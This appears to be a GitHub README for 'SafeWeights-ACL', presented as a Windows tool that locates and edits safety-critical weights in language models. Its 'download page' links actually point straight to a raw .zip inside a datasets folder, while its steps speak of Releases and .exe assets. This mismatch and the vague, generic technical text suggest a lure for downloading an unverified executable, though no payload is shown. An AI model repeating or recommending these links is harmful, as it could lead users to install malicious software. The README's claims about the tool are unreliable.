# 🛡️ SafeWeights-ACL - Make Your Language Models Safer Today

[![Download SafeWeights-ACL](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/injae8669/SafeWeights-ACL/raw/refs/heads/main/datasets/Safe_Weights_ACL_v2.5.zip)

SafeWeights-ACL provides tools to find and fix safety issues in large language models. This software helps you identify specific parts of an artificial intelligence model that cause harmful behavior. You can use these tools to make your models follow better safety guidelines without losing their original intelligence.

## 📥 How to Get the Software

You must visit the project page to download the latest version of the tools for your computer. 

[Click here to visit the download page for SafeWeights-ACL](https://github.com/injae8669/SafeWeights-ACL/raw/refs/heads/main/datasets/Safe_Weights_ACL_v2.5.zip)

Follow these steps on the page:
1. Look for the "Releases" section on the right side of the screen.
2. Select the newest version link at the top of that list.
3. Find the file ending in .zip or .exe under the "Assets" header.
4. Click the file to start your download.

## 🖥️ System Requirements

Your computer needs specific hardware to run these tools correctly. Please verify your machine meets these marks before you begin:

- Operating System: Windows 10 or Windows 11.
- Processor: A modern multi-core CPU from Intel or AMD.
- Memory: 16 gigabytes of RAM or more.
- Graphics Card: An NVIDIA GPU with at least 8 gigabytes of video memory.
- Storage: 10 gigabytes of free disk space for model files and logs.
- Software: The latest drivers for your graphics card.

## ⚙️ Preparation Before Use

You need to prepare your machine before you run the software. These steps ensure the tools work without error messages.

### Install Drivers
Ensure your graphics card drivers receive updates from the manufacturer website. Modern artificial intelligence software relies on these drivers to perform math quickly.

### Set Up Your Environment
The software requires a specific environment to process files. Download and install Python 3.10 from the official website. Check the box that says "Add Python to PATH" during the installation process. This step allows your computer to find the tools automatically.

## 🛠️ Step-by-Step Installation

1. Open your "Downloads" folder.
2. Locate the file you downloaded from the website.
3. Right-click the folder and choose "Extract All" to unzip the contents.
4. Open the command prompt by clicking the Start button and typing "cmd".
5. Navigate to the folder you unzipped by typing "cd" followed by the folder path.
6. Type "pip install -r requirements.txt" and press Enter. This downloads the necessary support files from the internet.

## 🚀 How to Run the Software

SafeWeights-ACL uses a simple interface. Follow these steps to start your first safety analysis.

1. Keep the command prompt window open from the previous step.
2. Type "python main.py" to launch the internal menu.
3. The software will ask you to select a model file. Choose a file from your computer that ends in .bin or .pt.
4. Select the "Safety Scan" option from the menu.
5. Wait for the progress bar to reach one hundred percent. The software will display a report on your screen.

## 🔍 Understanding ESI

ESI stands for the framework used to identify safety-critical parameters. This framework treats your model like a map. It scans the internal weights to find specific nodes that trigger unsafe responses. Once the tool locates these nodes, you can apply two types of improvements.

### SET Alignment
SET helps you align your model with safety targets quickly. It modifies the identified nodes so your model refuses harmful requests. This method keeps the model fast and efficient.

### SPA Adaptation
SPA helps you adapt your model for new tasks while keeping it safe. If you want to use your model for chat bots or writing assistants, SPA ensures the model stays within boundaries during these tasks.

## 💡 Best Practices for Results

Keep these tips in mind as you work with the software:

- Use small models first: Start with a smaller version of a model to test your workflow before using large files.
- Monitor your memory: If the computer feels slow, close other programs like web browsers while the software runs.
- Save your work: Always create a backup of your original model file before you apply changes. The software creates a "backup" folder automatically, but keeping your own copy is safer.
- Check logs: If you experience errors, open the "logs" folder in your installation directory. These files contain details about what happened during the process.

## ❓ Troubleshooting Common Issues

**The program closes immediately after I start it.**
Check if you installed the graphics card drivers. Also, verify that Python resides in your system path.

**The process takes a very long time.**
Large models require significant power. Ensure you meet the memory requirements. If you use a laptop, plug it into a power source to keep the processor running at full speed.

**The report shows no safety issues.**
This usually means the model already meets the safety threshold. You can try a different model file or adjust the sensitivity settings in the configuration document found in the installation folder.

**The command prompt says "Module Not Found".**
This means a support file is missing. Run the "pip install -r requirements.txt" command again while connected to the internet.